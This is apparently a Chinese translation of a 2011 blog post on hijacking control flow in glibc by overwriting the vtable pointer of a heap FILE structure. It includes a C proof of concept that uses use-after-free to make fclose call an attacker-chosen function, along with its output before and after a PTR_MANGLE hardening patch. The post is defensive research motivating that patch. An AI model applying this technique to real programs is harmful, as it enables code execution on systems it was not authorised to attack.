> 原文链接: https://www.anquanke.com//post/id/84874 


# 【技术分享】利用FILE结构执行任意代码


                                阅读量   
                                **102129**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：outflux
                                <br>原文地址：[https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)

译文仅供参考，具体内容表达以及含义原文为准



**翻译：**[**Ox9A82**](http://bobao.360.cn/member/contribute?uid=2676915949)

**稿费：50RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆<strong><strong><strong><strong><strong>[<strong>网页版**](http://bobao.360.cn/contribute/index)</strong></strong></strong></strong></strong></strong>**在线投稿**



**简介**

当我们想要攻击一个进程时，一个很有趣的目标就是堆上的FILE结构，FILE结构被glibc中的输入输出流函数（fopen()，fread()，fclose()等）所使用。 大多数FILE的结构（在内部是_IO_FILE结构）是指向用于各种流和标志的内存缓冲区的指针。有趣的是，这个指针并不是完整的结构。当一个新的FILE结构被成功分配并且其指针从fopen()函数返回时，glibc实际上分配了一个名为_IO_FILE_plus的内部结构，它包含了_IO_FILE结构和一个指向_IO_jump_t结构的指针，而这个结构又包含了附加到FILE的所有函数的指针列表。这就是它的vtable，其作用和结构就像C++的虚函数表一样，任何一个与FILE有关的流函数调用都会使用这张表。所以在堆上，我们有如下图的结构：

[![](https://p1.ssl.qhimg.com/t011058c39d1ce7ce94.png)](https://p1.ssl.qhimg.com/t011058c39d1ce7ce94.png)

对于use-after-free漏洞，堆溢出或者任意地址写漏洞，这个vtable指针是一个有趣的目标，很像可以在setjmp(),longjmp(),atexit()中找到的指针，可以被用来控制程序的执行流程。前一段时间，glibc引入了PTR_MANGLE/PTR_DEMANGLE来保护后面提到的这些函数，但是直到现在为止还没有以同样的方式保护FILE结构。

我希望能够改变这个状况，所以就引入了一个使用PTR_MANGLE的补丁来保护vtable指针。希望我没有忽略一些重要的东西，因为我真的很想看到这个补丁可以起到作用。其实，对FILE结构的利用要比对setjmp()和atexit()函数的利用更为常见 🙂

<br>

**演示demo**

下面是一个在use-after-free漏洞中利用的演示demo



```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void pwn(void)
`{`
    printf("Dave, my mind is going.n");
    fflush(stdout);
`}`
void * funcs[] = `{`
    NULL, // "extra word"
    NULL, // DUMMY
    exit, // finish
    NULL, // overflow
    NULL, // underflow
    NULL, // uflow
    NULL, // pbackfail
    NULL, // xsputn
    NULL, // xsgetn
    NULL, // seekoff
    NULL, // seekpos
    NULL, // setbuf
    NULL, // sync
    NULL, // doallocate
    NULL, // read
    NULL, // write
    NULL, // seek
    pwn,  // close
    NULL, // stat
    NULL, // showmanyc
    NULL, // imbue
`}`;
int main(int argc, char * argv[])
`{`   
    FILE *fp;
    unsigned char *str;
    printf("sizeof(FILE): 0x%xn", sizeof(FILE));
    /* Allocate and free enough for a FILE plus a pointer. */
    str = malloc(sizeof(FILE) + sizeof(void *));
    printf("freeing %pn", str);
    free(str);
    /* Open a file, observe it ended up at previous location. */
    if (!(fp = fopen("/dev/null", "r"))) `{`
        perror("fopen");
        return 1;
    `}`
    printf("FILE got %pn", fp);
    printf("_IO_jump_t @ %p is 0x%08lxn",
           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));
    /* Overwrite vtable pointer. */
    *(unsigned long*)(str + sizeof(FILE)) = (unsigned long)funcs;
    printf("_IO_jump_t @ %p now 0x%08lxn",
           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));
    /* Trigger call to pwn(). */
    fclose(fp);
    return 0;
`}`
```

在打补丁之前：



```
$ ./mini
sizeof(FILE): 0x94
freeing 0x9846008
FILE got 0x9846008
_IO_jump_t @ 0x984609c is 0xf7796aa0
_IO_jump_t @ 0x984609c now 0x0804a060
Dave, my mind is going.
```

在打补丁之后：

```
$ ./mini
sizeof(FILE): 0x94
freeing 0x9846008
FILE got 0x9846008
_IO_jump_t @ 0x984609c is 0x3a4125f8
_IO_jump_t @ 0x984609c now 0x0804a060
Segmentation fault
```

<br>

**后记**

一些聪明的读者可能会注意到，这个演示利用了glibc的另一个特性，就是它的malloc系统是不随机的，这允许攻击者确定各种结构在堆中相对于彼此的位置。我也很乐于看到它是固定的，但它需要更多的时间去学习。

[![](https://p3.ssl.qhimg.com/t015757374e79922e63.jpg)](https://p3.ssl.qhimg.com/t015757374e79922e63.jpg)[![](https://p0.ssl.qhimg.com/t0195679a91a7a55700.jpg)](https://p0.ssl.qhimg.com/t0195679a91a7a55700.jpg)
